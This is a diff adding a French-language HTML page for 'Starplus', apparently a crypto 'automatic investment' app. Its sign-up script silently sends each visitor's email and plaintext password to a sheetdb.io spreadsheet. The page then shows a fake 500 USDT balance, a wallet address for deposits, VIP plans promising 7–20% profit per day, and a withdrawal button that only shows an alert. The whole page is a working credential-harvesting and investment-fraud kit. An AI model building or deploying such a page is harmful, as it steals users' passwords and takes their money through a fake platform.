@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starplus | Système Automatique Complet</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #c0ff00;
+            --bg: #0f1115;
+            --card: #1c1f26;
+            --text: #ffffff;
+            --blue: #2d65ff;
+            --red: #ff4757;
+        }
+
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding-bottom: 90px; }
+        .paj { display: none; padding: 20px; animation: fadeIn 0.4s ease; }
+        .paj.aktive { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* --- STYLE LOGIN --- */
+        #paj-login { background: var(--bg); height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .input-group { width: 85%; background: var(--card); padding: 25px; border-radius: 20px; border: 1px solid #333; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; }
+
+        /* --- UI ELEMENTS --- */
+        .balance-card { background: linear-gradient(135deg, var(--primary), #8bc34a); color: #000; padding: 25px; border-radius: 24px; margin-bottom: 20px; }
+        .card-auto { background: var(--card); border-radius: 18px; padding: 18px; margin-bottom: 15px; border: 1px solid #2d2d2d; }
+        .btn-main { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; }
+        
+        /* --- BOTTOM NAV --- */
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #2d2d2d; z-index: 100; }
+        .nav-item { color: #666; text-align: center; font-size: 11px; cursor: pointer; }
+        .nav-item.active { color: var(--primary); }
+    </style>
+</head>
+<body>
+
+    <div id="paj-login" class="paj aktive">
+        <h1 style="color: var(--primary); font-size: 40px; margin-bottom: 10px;">STARPLUS</h1>
+        <p style="color: #888; margin-bottom: 30px;">Investissez dans le futur</p>
+        
+        <div class="input-group">
+            <h3>Créer un compte</h3>
+            <input type="email" id="user-email" placeholder="Email">
+            <input type="password" id="user-pass" placeholder="Mot de passe">
+            <button class="btn-main" style="background: var(--primary); color: #000; margin-top: 10px;" onclick="connexion()">S'inscrire / Connexion</button>
+            <p style="font-size: 12px; color: #666; margin-top: 15px;">En continuant, vous acceptez nos termes et conditions.</p>
+        </div>
+    </div>
+
+    <div id="paj-home" class="paj">
+        <div class="balance-card">
+            <small>Solde Actuel (USDT)</small>
+            <h1 style="font-size: 35px; margin: 10px 0;">500.00</h1>
+            <p style="font-size: 12px; font-weight: bold;">Compte: <span id="display-email">...</span></p>
+        </div>
+
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+            <div class="card-auto" onclick="montrePaj('paj-recharge')" style="text-align:center;"><i class="fas fa-arrow-up" style="color:var(--blue)"></i><br>Dépôt</div>
+            <div class="card-auto" onclick="montrePaj('paj-retrait')" style="text-align:center;"><i class="fas fa-arrow-down" style="color:var(--red)"></i><br>Retrait</div>
+        </div>
+
+        <h3>Plans VIP Actifs</h3>
+        <div id="vip-list"></div>
+    </div>
+
+    <div id="paj-vip" class="paj">
+        <h2 style="color:var(--primary)">Plans VIP Automatiques</h2>
+        <div id="vip-list-page"></div>
+    </div>
+
+    <div id="paj-retrait" class="paj">
+        <h2>Retrait (Traitement 30 min)</h2>
+        <div class="card-auto">
+            <label>Montant à retirer (USDT)</label>
+            <input type="number" placeholder="Min 5 USDT">
+            <label>Adresse USDT (BEP20)</label>
+            <input type="text" placeholder="Collez votre adresse ici">
+            <button class="btn-main" style="background:var(--red); color:white;" onclick="alert('Traitement en cours...')">Lancer le Retrait</button>
+        </div>
+    </div>
+
+    <div id="paj-recharge" class="paj">
+        <h2>Déposer des USDT (BEP20)</h2>
+        <div class="card-auto" style="text-align:center;">
+            <p>Envoyez vos fonds à l'adresse suivante :</p>
+            <div style="background:#000; padding:15px; border-radius:10px; border:1px dashed var(--primary); word-break:break-all; font-family:monospace; margin-bottom:15px;">
+                0x93ba288d4fe6c64234a44f3234cbf6949e76246e
+            </div>
+            <button class="btn-main" style="background:var(--primary); color:#000;" onclick="alert('Adresse Copiée!')">Copier l'adresse</button>
+        </div>
+    </div>
+
+    <nav id="main-nav" class="nav-bar" style="display:none;">
+        <div class="nav-item active" onclick="montrePaj('paj-home', this)"><i class="fas fa-home fa-lg"></i><br>Maison</div>
+        <div class="nav-item" onclick="montrePaj('paj-vip', this)"><i class="fas fa-crown fa-lg"></i><br>VIP</div>
+        <div class="nav-item" onclick="montrePaj('paj-retrait', this)"><i class="fas fa-wallet fa-lg"></i><br>Retrait</div>
+        <div class="nav-item" onclick="location.reload()"><i class="fas fa-sign-out-alt fa-lg"></i><br>Sortie</div>
+    </nav>
+
+    <script>
+        // Done pou VIP yo
+        const vips = [
+            { n: 1, p: 20, r: 7 }, { n: 2, p: 60, r: 8 }, { n: 3, p: 150, r: 9 },
+            { n: 4, p: 400, r: 10 }, { n: 5, p: 1000, r: 12 }, { n: 6, p: 2500, r: 15 }, { n: 7, p: 6000, r: 20 }
+        ];
+
+        // Fonksyon Koneksyon Reyèl
+        async function connexion() {
+            const email = document.getElementById('user-email').value;
+            const pass = document.getElementById('user-pass').value;
+            const API_URL = 'https://sheetdb.io/api/v1/rrbn0ie4z33bb';
+
+            if(email === "" || pass === "") { 
+                alert("Veuillez remplir les champs"); 
+                return; 
+            }
+
+            try {
+                // Voye done nan Google Sheets
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ data: [{ Email: email, Password: pass, Date: new Date().toLocaleString() }] })
+                });
+
+                // Si sa mache, antre nan sit la
+                document.getElementById('display-email').innerText = email;
+                document.getElementById('paj-login').style.display = 'none';
+                document.getElementById('main-nav').style.display = 'flex';
+                montrePaj('paj-home');
+            } catch (e) {
+                alert("Erreur de connexion. Vérifiez votre internet.");
+            }
+        }
+
+        // Fonksyon pou chanje paj
+        function montrePaj(id, el) {
+            document.querySelectorAll('.paj').forEach(p => p.classList.remove('aktive'));
+            document.getElementById(id).classList.add('aktive');
+            if(el) {
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                el.classList.add('active');
+            }
+        }
+
+        // Jenere lis VIP yo nan paj VIP a
+        const vContainer = document.getElementById('vip-list-page');
+        vips.forEach(v => {
+            vContainer.innerHTML += `
+                <div class="card-auto" style="border-left: 5px solid gold;">
+                    <b style="font-size:18px;">VIP ${v.n}</b><br>
+                    <small>Prix: ${v.p} USDT | Profit: ${v.r}%/jour</small>
+                    <button class="btn-main" style="background:var(--primary); color:#000; margin-top:10px; padding:5px;">Activer</button>
+                </div>
+            `;
+        });
+    </script>
+</body>
+</html>
